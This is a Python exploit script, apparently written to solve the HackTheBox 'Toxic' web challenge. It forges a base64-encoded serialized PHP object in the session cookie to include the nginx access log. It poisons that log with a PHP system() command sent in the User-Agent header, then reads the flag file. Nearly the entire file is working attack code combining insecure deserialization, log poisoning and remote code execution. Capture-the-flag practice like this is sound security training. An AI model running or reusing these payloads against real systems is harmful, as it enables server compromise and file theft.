import requests, base64, argparse, signal, re
from pwn import *

BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RESET = '\033[39m'

parse = argparse.ArgumentParser("Ingrese la url del reto web TOXIC de HTB")
parse.add_argument('-u', '--url', help="Url del sitio web")
parse = parse.parse_args()

banner = f"""
{CYAN}████████╗ ██████╗ ██╗  ██╗██╗ ██████╗
╚══██╔══╝██╔═══██╗╚██╗██╔╝██║██╔════╝
   ██║   ██║   ██║ ╚███╔╝ ██║██║     
   ██║   ██║   ██║ ██╔██╗ ██║██║     
   ██║   ╚██████╔╝██╔╝ ██╗██║╚██████╗
   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝                            
██╗  ██╗████████╗██████╗             
██║  ██║╚══██╔══╝██╔══██╗            
███████║   ██║   ██████╔╝            
██╔══██║   ██║   ██╔══██╗            
██║  ██║   ██║   ██████╔╝            
╚═╝  ╚═╝   ╚═╝   ╚═════╝ 
{GREEN}BY: Alcatraz2033{CYAN} {RESET}                                                               
"""


def ctrl_c(sig, frame):
    print(f"\n\n{RED}[!] Saliendo...{RESET}")
    exit()

signal.signal(signal.SIGINT, ctrl_c)

def send_get():
    p1 = log.progress("Flag")
    flag = ''
    data = 'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}'
    cookies = {
        "PHPSESSID" : f"{base64.b64encode(data.encode('utf-8')).decode('utf-8')}"
        }
    user_agent = {
        'User-agent': "<?php system('ls /');?>"
        }
        
    r = requests.get(parse.url, headers=user_agent, cookies=cookies)

    for i in r.text.split():
        if re.search('flag_', i):
            flag = i
        if flag != '':
            break

    data = 'O:9:"PageModel":1:{s:4:"file";s:11:"/%s";}' %flag
    cookies = {
        "PHPSESSID" : f"{base64.b64encode(data.encode('utf-8')).decode('utf-8')}"
        }
    r = requests.get(parse.url, cookies=cookies)
    p1.status(r.text)

if __name__ == '__main__':
    if parse.url:
        print(banner)
        send_get()
    else:
        print(f"{RED}[!]{RESET} Uso python3 toxicHTB.py -u http://somewebpeage:1234")
